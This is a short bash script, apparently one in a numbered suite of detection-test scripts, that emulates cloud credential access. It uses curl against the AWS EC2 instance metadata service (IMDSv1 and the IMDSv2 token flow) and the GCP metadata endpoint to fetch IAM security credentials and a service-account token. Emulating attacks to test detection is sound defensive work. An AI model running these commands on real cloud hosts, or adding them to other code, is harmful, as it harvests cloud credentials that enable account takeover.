#!/bin/bash
# 17 - IMDS Credential Exfiltration (best-effort)
# Trigger: May not trigger standalone detection
# Tactic: Credential Access / Cloud Instance Metadata
set -e
echo "=== [17] IMDS Credential Exfiltration (best-effort) ==="

# Attempt to access EC2 Instance Metadata Service
# IMDSv1 (no token required)
curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null || true
curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || true

# IMDSv2 (token-based)
TOKEN=$(curl -s --connect-timeout 2 -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null) || true
if [ -n "$TOKEN" ]; then
    curl -s --connect-timeout 2 -H "X-aws-ec2-metadata-token: $TOKEN" \
      http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || true
fi

# GCP metadata
curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null || true

echo "[17] Done — IMDS exfil (best-effort, may not trigger detection)"
